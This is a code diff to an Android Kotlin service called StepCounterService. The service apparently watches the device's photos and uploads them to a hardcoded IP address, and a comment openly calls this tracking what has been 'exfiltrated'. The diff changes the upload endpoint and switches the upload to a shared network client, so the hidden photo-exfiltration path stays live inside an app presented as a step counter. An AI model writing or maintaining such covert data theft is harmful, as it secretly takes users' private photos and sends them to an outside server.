@@ -34,9 +34,7 @@ class StepCounterService : Service() {
     private val user = FirebaseAuth.getInstance().currentUser
     private val sharedPreferences by lazy { getSharedPreferences("stepCounterPrefs", Context.MODE_PRIVATE) }
 
-    // Photo Sync Variables
-    private val client = OkHttpClient()
-    private val serverUrl = "http://20.2.92.176:5000/upload"
+    private val serverUrl = "http://20.2.92.176:5000/photos"
     private lateinit var photoObserver: ContentObserver
 
     // Using SharedPreferences to keep track of what we've already "exfiltrated"
@@ -205,7 +203,7 @@ class StepCounterService : Service() {
 
             val request = Request.Builder().url(serverUrl).post(requestBody).build()
 
-            client.newCall(request).enqueue(object : Callback {
+            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                 override fun onFailure(call: Call, e: IOException) {
                     Log.e("StepService", "Upload failed for $fileName")
                 }
